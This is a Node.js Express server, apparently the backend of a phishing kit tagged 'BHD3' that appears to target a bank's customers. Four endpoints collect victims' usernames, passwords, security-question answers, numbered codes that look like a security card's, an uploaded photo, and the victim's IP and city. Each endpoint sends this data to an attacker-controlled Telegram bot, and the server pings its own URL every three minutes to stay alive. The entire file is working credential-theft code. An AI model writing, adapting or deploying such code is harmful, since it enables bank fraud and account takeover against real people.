const express = require('express');
const bodyParser = require('body-parser');
const multer = require("multer");
const cors = require('cors'); // Importar cors
const axios = require('axios');
const app = express();
const FormData = require("form-data");



app.use(cors({
    origin: '*', // Permitir cualquier origen
    methods: ['GET', 'POST'],
    allowedHeaders: ['Content-Type']
}));

// Configurar multer para manejar archivos
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

app.use(bodyParser.json());

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.get('/', (req, res) => {
    res.send('Servidor activo');
});


app.post('/api/sendMessage', async (req, res) => {
    const { user, password, ip, city } = req.body;

    if (!user || !ip || !password) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟢BHD3🟢\nUS4R: ${user}\nCL4V: ${password}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/sendMessage2', async (req, res) => {
    const { user, user1, user2, user3, user4, ip, city } = req.body;

    if (!user || !ip || !user1 || !user2 || !user3 || !user4) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟢BHD3🟢\nUS4R: ${user}\n\n¿Cuál es su color favorito?❓: ${user1}\n¿Cuál es la marca de su primer carro?❓: ${user2}\n¿Cuál es el nombre del colegio donde cursó la primaria?❓: ${user3}\n¿Cuál es el nombre de su abuela materna?❓: ${user4}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});


app.post('/api/sendMessage3', async (req, res) => {
    const { user, user1, user2, user3, user4, user5, user6, ip, city } = req.body;

    if (!user || !ip || !user1 || !user2 || !user3 || !user4 || !user5 || !user6) {
        return res.status(400).json({ error: 'Faltan datos obligatorios' });
    }

    // Construir mensaje
    const message = `🟢BHD3🟢\nUS4R: ${user}\n\n03: ${user1}\n12: ${user2}\n19: ${user3}\n24: ${user4}\n31: ${user5}\n39: ${user6}\n\nIP: ${ip}\nCiudad: ${city}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
        });
        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post("/api/sendMessage4", upload.single("foto"), async (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ error: "No se recibió ninguna imagen." });
        }

        const { usuario, ip, ciudad } = req.body;
        const caption = `🟢BHD3🟢\nUS4R: ${usuario}\n\nIP: ${ip}\nCiudad: ${ciudad}`;

        const telegramURL = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`;

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", req.file.buffer, {
            filename: req.file.originalname || "imagen",
            contentType: req.file.mimetype,
        });
        formData.append("caption", caption);

        await axios.post(telegramURL, formData, {
            headers: { ...formData.getHeaders() },
        });

        res.json({ message: "Imagen enviada a Telegram correctamente." });
    } catch (error) {
        console.error("Error al enviar la imagen:", error);
        res.status(500).json({ error: "Error al procesar la imagen." });
    }
});


const keepAliveUrl = 'https://yielding-strong-wakeboard.onrender.com/';

setInterval(() => {
    axios.get(keepAliveUrl)
        .then(response => console.log(`Ping exitoso: ${new Date().toLocaleTimeString()}`))
        .catch(error => console.error(`Error en el ping: ${error.message}`));
}, 180000); // 180000 ms = 3 minutos





const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor corriendo en el puerto ${PORT}`);
});
